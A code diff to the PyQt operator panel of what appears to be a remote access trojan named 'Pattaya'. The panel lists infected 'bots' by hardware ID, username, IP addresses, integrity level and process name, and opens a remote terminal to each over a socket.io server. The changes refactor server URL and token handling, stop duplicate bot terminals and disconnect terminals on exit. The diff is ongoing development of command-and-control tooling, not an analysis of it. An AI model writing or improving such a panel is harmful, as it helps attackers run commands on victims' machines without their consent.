@@ -29,6 +29,8 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         if(self.settings.value("themes") is None):
             self.settings.setValue("themes", 0)
         
+        self.url = ""
+        self.token = ""
 
         self.about_dialog = AboutPattayaWidget()
         self.about_dialog.setWindowModality(Qt.WindowModality.ApplicationModal)
@@ -109,10 +111,6 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.pattaya_server_setting.setWindowIcon(QIcon(":/assets/images/rat.png"))
 
         
-        
-
-
-
     def app_exit(self):
         self.app.exit()
 
@@ -171,7 +169,10 @@ HWID -> {item['hwid']}
         if item is None:
             return
         
-        terminal = BotTerminalWidget(item, self.socket_io_client)
+        if PattayaPanelUtil.terminals.get(item['hwid']) is not None:
+            return
+        
+        terminal = BotTerminalWidget(item, self.url, self.token, "/")
         old_title = terminal.windowTitle()
         update_title = old_title.replace('$USERNAME', item['username']).replace('$LAN', item['lanIp']).replace('$WAN', item['wanIp']).replace('$INTEGR', item['integrity']).replace('$PN', item['processName'])
         terminal.setWindowTitle(update_title)
@@ -193,17 +194,17 @@ HWID -> {item['hwid']}
 
     def start(self):
         # get current values for settings
-        url = self.settings.value("url")
-        token = self.settings.value("token")
+        self.url = self.settings.value("url")
+        self.token = self.settings.value("token")
 
-        if url == None or token == None:
+        if  self.url == None or  self.token == None:
             PattayaPanelUtil.panel_log_error(f'Pattaya socket.io server configuration not found in system')
             QMessageBox.warning(self, 
             "Pattaya Panel Alert",
             "Not found Pattaya server setting, Please check your server setting",
             QMessageBox.Ok)
         else:
-            self.socket_io_client.start(url, token, "/")
+            self.socket_io_client.start( self.url,  self.token, "/")
         
 
 
@@ -249,8 +250,9 @@ HWID -> {item['hwid']}
 
     def refresh_bot(self):
         self.socket_io_client.socket_io.emit("panel_request_bot_data")
-
-
+        
 
     def closeEvent(self, event):
-        del PattayaPanelUtil.terminals
+        for terminal in PattayaPanelUtil.terminals.values():
+            terminal.socket_io_client.disconnect()
+            terminal.close()
